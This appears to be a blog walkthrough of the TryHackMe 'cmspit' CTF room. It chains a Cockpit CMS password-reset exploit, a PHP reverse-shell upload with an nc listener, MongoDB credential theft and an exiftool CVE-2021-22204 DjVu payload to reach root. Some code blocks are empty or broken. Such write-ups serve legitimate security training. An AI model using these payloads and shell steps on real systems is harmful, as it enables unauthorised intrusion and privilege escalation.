### Overview

[cmspit](https://tryhackme.com/room/cmspit) is a medium rated CTF room on [TryHackMe](https://tryhackme.com). This was a good machine highlighting recent CVE's, thanks [stuxnet](https://twitter.com/_stuxnet).

### Nmap

Although not required I added a entry in my hosts file with the machine IP to cmspit.thm. Once added I started a nmap scan to check for available ports.

```highlight
└──╼ $sudo nmap -sC -sV -oA nmap/initial cmspit.thm

2 Ports open:

- 22 - SSH - OpenSSH 7.2p2 
- 80 - HTTP - Apache 2.4.18

I ran a full port scan but no additional ports were found.

### Enumeration

Clearly this is going to be a web challenge, while I poked around the website I wanted some enumeration going on in the background so started Gobuster and Nikto.

However is looks like all requests are being sent to 'http://cmspit.thm/auth/login?to=/'

However, I did have some more luck with Nikto.

I went to http://cmspit.thm/ which redirected me to http://cmspit.thm/auth/login?to=/. I tried some basic username and password combinations but nothing worked.

![homepage](/assets/images/cmspit/homepage.png)

From the logo and name on the authentication page, its clear we are working with Cockpit CMS. I checked the source code and found the version 0.11.1. This was also confirmed by going to http://cmspit.thm/package.json found via Nikto.

![version](/assets/images/cmspit/version.png)

I googled 'cockpit cms 0.11.1 exploit' and found a great [blog](https://swarm.ptsecurity.com/rce-cockpit-cms/) by [Nikita Petrov](https://twitter.com/ultrayoba), however im lazy and also found a metasploit module.

I ran the module and was able to find 4 users, however the module then failed as a user was required.

```highlight

I set user to admin and ran the module again.

The exploit failed again however it was able to change the admin password. I went back to the login page and was able to log in as admin.

### Initial Access

In the blog post, RCE was possible by uploading a PHP script via the finder directory so I went to cmspit.thm/finder

I copied a PHP reverse shell script to my directory.

```highlight
└──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
└──╼ $mv php-reverse-shell.php shell.php
┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
```

I updated the script with my tun0 IP and port of 4444 and started a nc listener with the command ``` nc -nvlp 4444```. On the webpage I clicked the upload button and selected my shell.php file.

Now going to 'http://cmspit.thm/shell.php' I get a shell!

### Priv Esc

Now I have a shell as www-data I want to escalate my privileges. I enumerated the machine and noticed Mongodb was listening on TCP port 27017.

```highlight

```

I connected to the mongodb service and was able to find the credentials for the user 'stux'.

```highlight

{ "_id" : ObjectId("60a89dfbaadffb0ea68915fa"), "name" : "stux" }
```

I used the credentials to SSH to the machine and ran the command 'sudo -l'.

```highlight

The user stux can run the command /usr/local/bin/exiftool as root with out the root password. Normally, I would now go to GTFObins to look for a priv esc, however the room questions indicate a CVE vulnerability so I googled 'exiftools CVE' and found this [blog](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/). 

In the blog it details the steps of how to exploit the vulnerability which is:

>$ sudo apt install djvulibre-bin
> 
>$ bzz payload payload.bzz
> 
>$ djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz

Back on my local machine, I created a payload file with the following contents ```(metadata "\c${system('/bin/bash')};")```, then followed the steps above.

```highlight
┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]

Finaly I started a Python webserver with the command ```sudo python3 -m http.server 80```. Next back on cmspit machine I downloaded the exploit.djvu file with wget and ran the exif tool as sudo against the exploit file and got root!
